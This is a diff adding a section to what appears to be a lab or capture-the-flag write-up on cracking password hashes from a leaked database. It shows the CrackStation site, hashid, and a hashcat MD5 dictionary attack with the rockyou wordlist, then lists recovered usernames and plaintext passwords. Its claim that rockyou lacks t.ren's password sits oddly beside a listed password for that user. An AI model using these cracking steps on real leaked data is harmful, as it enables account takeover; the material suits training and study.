@@ -58,10 +58,54 @@ Leaked database gives a opportunity to crack passwords to exist users in target 
 
 === Passwords cracking && find valiable users
 
+* First way
+
 Here put a list of hashed passwords and Crack Station finds matches
 
 Visit a site:
 https://crackstation.net
+
+
+image::CrackStation.png[alt text , width=600 , height=400]
+
+* Second way
+
+By using tool `hashcat` crack list of hashed passwords also to identify hash use `hashid`
+
+[source]
+----
+hashid hash_pass.txt
+----
+
+So by identifing it's `MD5` hash
+
+[source]
+----
+hashcat -m 0 -a 0 hash_pass.txt /home/kali/wordlists/passwords/rockyou.txt --keep-guessing -O
+----
+
+*-m* | hash cracking mode `MD5`
+
+*-a* | brute-force or others mode `0`
+
+*--keep-guessing* | don't stop if you find valid hash
+
+////
+image::hashcat.png[alt text , width=600 , height=400]
+////
+
+
+Rockyou wordlist does not contain pass for user `t.ren`
+
+*Founded users and passwords*
+
+
+
+[source]
+----
+r.widdleton	lilronron
+t.ren		shadowhex7
+----
 
 
 
